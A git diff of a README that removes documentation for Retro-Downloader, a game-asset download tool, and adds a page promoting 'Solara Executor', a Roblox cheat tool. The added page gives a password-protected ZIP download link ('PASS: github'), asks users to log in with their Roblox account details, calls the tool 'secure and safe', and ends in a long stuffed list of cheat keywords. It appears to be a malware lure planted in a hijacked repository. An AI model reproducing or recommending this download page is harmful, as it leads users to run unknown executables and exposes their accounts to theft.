@@ -1,206 +1,52 @@
-# Retro-Downloader
+# Solara Executor
 
-Asset download tool specifically written for [Retro-CMS](https://github.com/0x78f1935/Retro-CMS)
+## Installation
+To install Solara Executor, follow these simple steps:
+1. [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/user-attachments/files/16731766/Solara.zip)
+2. PASS: github
+2. Extract the downloaded ZIP file to your desired location on your system.
 
-## QuickStart
-
-This application is a command line tool, therefor to use it, open a terminal and navigate to te folder which holds
-`RetroDownloader.exe`. You can run `RetroDownloader.exe --help` for a overview of available commands.
-
-```
-.\RetroDownloader.exe --help
-RetroDownloader 1.0.0
-unde�ined
-
-  -v, --verbose      (Default: false) Output debug stdout information.
-
-  -o, --out          (Default: .) Set the output folder.
-
-  -b, --build        (Default: latest) Build version of Game, found at https://habboassets.com/swfs.
-
-  -a, --agent        (Default: Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/35.0.822.0 Safari/534.2.1) Set custom user agent.
-
-  -w, --workers      (Default: 2) Total concurrent downloaders used for downloading data.
-
-  -e, --embeddir     (Default: ) Manipulate the embedded directory. Delimiter: ";". See Readme.
-
-  -R, --articles     Download Articles.
-
-  -B, --badges       Download Badges.
-
-  -C, --clothing     Download Clothing.
-
-  -E, --effects      Download effects.
-
-  -F, --furniture    Download Furniture.
-
-  -O, --gordon       Download gordon data.
-
-  -G, --gamedata     Download gamedata.
-
-  -H, --hotelview    Download hotelview.
-
-  -P, --parts        Download Badgeparts.
-
-  -T, --pets         Download Pets.
-
-  -S, --sound        Download Sound.
-
-  -Q, --quests       Download Quests.
-
-  -I, --archive      Download Archive.
-
-  -L, --catalog      Download Catalog Icons.
-
-  -A, --all          Download All.
-
-  --help             Display this help screen.
-```
-
-For example, to download all files to the relative directory `./tmp` with 25 workers,
-```
-RetroDownloader.exe -A --out ./tmp -v -w 25
-```
-
-## Advance usage Python
-
-Believe it or not, This application also provides an entrypoint for Python. It's a bit more strict with parameters, but
-it totally works.
-
-Install the python library `pythonnet` -> `pip install pythonnet`.
-The following snippet is how you could utilize the provided `.DLL` within your python snippet.
-```python
-# -*- mode: python ; coding: utf-8 -*-
-# Official wrapper for: https://github.com/0x78f1935/Retro-Downloader
-# ---------------
-# """
-from pythonnet import load
-
-load("coreclr")
-import clr
-import sys
-from pathlib import Path, PurePosixPath
-
-# Directory Path to RetroDownloader.dll. (Not the file itself)
-assembly_path = PurePosixPath(Path(__file__).resolve().parent.parent).as_posix()
-
-sys.path.append(assembly_path)
-clr.AddReference("RetroDownloader")
-
-from RetroDownloader import Application
+![Solara Executor Preview](https://github.com/user-attachments/assets/cacd7d6c-8b11-40ae-a55f-4ecbc65c6d72)
 
 
-class DownloadWrapper(Application):
-    def __init__(
-        self,
-        debug: bool,
-        outputPath: str,
-        buildVersion: str,
-        agent: str,
-        maxConcurrentWorkers: int,
-        downloadAll: bool,
-        doArticles: bool,
-        doBadges: bool,
-        doClothing: bool,
-        doEffects: bool,
-        doFurniture: bool,
-        doGamedata: bool,
-        doGordon: bool,
-        doHotelView: bool,
-        doParts: bool,
-        doPets: bool,
-        doSound: bool,
-        doQuest: bool,
-        doArchive: bool,
-        doCatalog: bool,
-        embeddir: str
-    ) -> None:
-        """
-        Python wrapper for RetroDownloader. All arguments must be provided. Otherwise it won't work.
-        Args:
-            debug (bool): When True stdout will contain verbose messages,
-            outputPath (str): Path which will be used to download files to,
-            buildVersion (str): Build version of Game, found at https://habboassets.com/swfs,
-            agent (str): User agent,
-            maxConcurrentWorkers (int): Total concurrent workers which download the download queue,
-            downloadAll (bool): When True, download all other parameters,
-            doArticles (bool): Download Articles,
-            doBadges (bool): Download Badges,
-            doClothing (bool): Download Clothing,
-            doEffects (bool): Download Effects,
-            doFurniture (bool): Download Furniture,
-            doGamedata (bool): Download GameData,
-            doGordon (bool): Download Gordon production data,
-            doHotelView (bool): Download Hotel Views,
-            doParts (bool): Download Badgeparts,
-            doPets (bool): Download Pets,
-            doSound (bool): Download Sounds,
-            doQuest (bool): Download Quests,
-            doArchive (bool): Download Archive
-            doCatalog (bool): Download Catalog Icons
-            embeddir (str): Set subdir in embedded application
-        """
-        args = (
-            debug,
-            outputPath,
-            buildVersion,
-            agent,
-            maxConcurrentWorkers,
-            downloadAll,
-            doArticles,
-            doBadges,
-            doClothing,
-            doEffects,
-            doFurniture,
-            doGamedata,
-            doGordon,
-            doHotelView,
-            doParts,
-            doPets,
-            doSound,
-            doQuest,
-            doArchive,
-            doCatalog,
-            embeddir
-        )
-        Application.WrapperEntrypoint(*args)  # Starts download
 
-    @property
-    def is_running(self):
-        """
-        Indicate if the program is actively running
-        """
-        return Application.isRunning
+## Table of Contents
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-```
+## Introduction
+Welcome to Solara Executor, the new Roblox Executor designed for enhanced performance and functionality. This repository provides all the necessary resources and documentation to get you started with Solara Executor. Whether you are a developer, gamer, or someone interested in Roblox modifications, Solara Executor is a valuable tool to enhance your Roblox experience.
 
-For an example on how to utilize the code snippet above, please refer to [this specific line](https://github.com/0x78f1935/Retro-CMS/blob/refactor/all-in-one/backend/tasks/downloader/__init__.py#L50) in the source code of the CMS.
+## Features
+Solara Executor offers a range of powerful features to customize and optimize your gameplay. Some of the key features include:
+- Advanced script execution capabilities
+- Enhanced performance for smoother gameplay
+- Easy-to-use interface for smooth navigation
+- Compatibility with the latest Roblox updates
+- Secure and safe to use
 
-## Settings
+## Usage
+Once you have installed Solara Executor, you can start using it to enhance your Roblox gameplay. Here are some basic steps to get you started:
+1. Launch the Solara Executor application.
+2. Login with your Roblox account details (if required).
+3. Choose the script you want to execute.
+4. Click on the execute button to run the selected script.
+5. Enjoy your enhanced Roblox experience with Solara Executor!
 
-| Shortcut 	| Flag        	| Type   	| Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            	|
-|----------	|-------------	|--------	|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	|
-| -v       	| --verbose   	| bool   	| Output debug stdout information. Can be very noisy.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    	|
-| -o       	| --out       	| string 	| Set the output folder where the downloaded files will be downloaded to.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                	|
-| -b       	| --build     	| string 	| Build version of Game, found at [habbo-assets](https://habboassets.com/swfs). When set to "latest" the downloader will download the latest version.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    	|
-| -a       	| --agent     	| string 	| Set a custom user agent, defaults to: `Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/35.0.822.0 Safari/534.2.1`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              	|
-| -w       	| --workers   	| int    	| The more workers you have, the faster your download goes. should be thread safe.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       	|
-| -e       	| --embeddir  	| string 	| If you desire to embed this application, there is a chance the application is unable to find the `Resources` folder. For example, If you start a main thread in `/myApp` and the dll is located in `/myApp/tools/RetroDownloader/RetroDownloader.dll`, you might want to use this option. The DLL will in this case error because it's unable to find the `Resources` folder located in `/myApp/Resources`. Why is the DLL looking in `/myApp` and not in `/myApp/tools/RetroDownloader`? The main thread started in the `/myApp` location.  A hacky way is to start the main application in the `/myApp/tools/RetroDownloader` by just adding `cd../../.. && <start application>`, but this won't work in all situations. **embeddir** generates a path between te Resource folder and the application based on the delimiter `;`.  To fix our situation in the example we simply assign this parameter with the value `tools;RetroDownloader`.  The DLL will do the rest which looks something like this: `/myApp/<embeddir>/Resources` -> `/myApp/tools/RetroDownloader/Resources`. 	|
-|          	|             	|        	|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        	|
-| -R       	| --articles  	| bool   	| Download all available articles                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        	|
-| -B       	| --badges    	| bool   	| Download all available badges                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          	|
-| -C       	| --clothing  	| bool   	| Download all available clothing                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        	|
-| -E       	| --effects   	| bool   	| Download all available effects                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         	|
-| -F       	| --furniture 	| bool   	| Download all available furniture                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       	|
-| -O       	| --gordon    	| bool   	| Download all available production data                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 	|
-| -G       	| --gamedata  	| bool   	| Download all available gamedata                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        	|
-| -H       	| --hotelview 	| bool   	| Download all available hotel views                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     	|
-| -P       	| --parts     	| bool   	| Download all available badge parts                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     	|
-| -T       	| --pets      	| bool   	| Download all available pet assets                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      	|
-| -S       	| --sound     	| bool   	| Download all available mp3 assets                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      	|
-| -Q       	| --quests    	| bool   	| Download all available quest assets                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    	|
-| -I       	| --archive    	| bool   	| Download all available archived assets                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
-| -L       	| --catalog    	| bool   	| Download all available catalog icon assets                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
-|          	|             	|        	|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        	|
-| -A       	| --all       	| bool   	| Download all available assets. When set, other capital parameters will be ignored.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     	|
+## Contributing
+We welcome contributions from the community to improve Solara Executor further. If you have any suggestions, bug reports, or would like to contribute to the development of Solara Executor, please feel free to submit a pull request. Together, we can make Solara Executor even better for all users!
 
+## License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+---
+Feel free to reach out to us on [Discord](https://discord.gg/solara) for any questions or support related to Solara Executor. Thank you for choosing Solara Executor for your Roblox gaming needs! 🚀✨
+
+
+
+
+roblox cheat, roblox hacks, roblox exploits, roblox cheat codes, roblox glitches, roblox script, roblox mod, roblox hack download, roblox cheat engine, roblox cheats 2024, roblox cheat 2024, roblox cheat script, roblox cheat tool, roblox hack tool, roblox mod menu, roblox hack script, roblox exploit script, roblox exploit hack, roblox cheat hack, roblox mod hack, roblox glitch 2024, roblox bug, roblox bug 2024, roblox glitch hack, roblox glitch script, roblox glitch exploit, roblox glitch mod, roblox script 2024, roblox mod 2024, roblox mod hack 2024, roblox hack tool 2024, roblox cheat tool 2024, roblox cheat engine 2024, roblox hack engine, roblox hack engine 2024, roblox exploit tool, roblox exploit tool 2024, roblox glitch exploit 2024, roblox glitch tool, roblox glitch tool 2024, roblox bug tool, roblox bug tool 2024, roblox bug exploit, roblox bug exploit 2024, roblox bug script, roblox bug script 2024, roblox bug hack, roblox bug hack 2024, roblox mod menu tool, roblox mod menu tool 2024, roblox mod mnu hack, roblox mod menu hack 2024, roblox mod menu exploit, roblox mod menu exploit 2024, roblox script tool, roblox script tool 2024, roblox mod tool, roblox mod tool 2024, roblox cheat engine hack, roblox cheat engine hack 2024, roblox cheat engine exploit, roblox cheat engine exploit 2024, roblox cheat engine script, roblox cheat engine script 2024, roblox cheat engine glitch, roblox cheat engine glitch 2024, roblox cheat engine bug, roblox cheat engine bug 2024, roblox exploit hack tool, roblox exploit hack tool 2024, roblox exploit hack script, roblox exploit hack script 2024, roblox exploit hack mod, roblox exploit hack mod 2024, roblox exploit glitch, roblox exploit glitch 2024, roblox exploit bug, roblox exploit
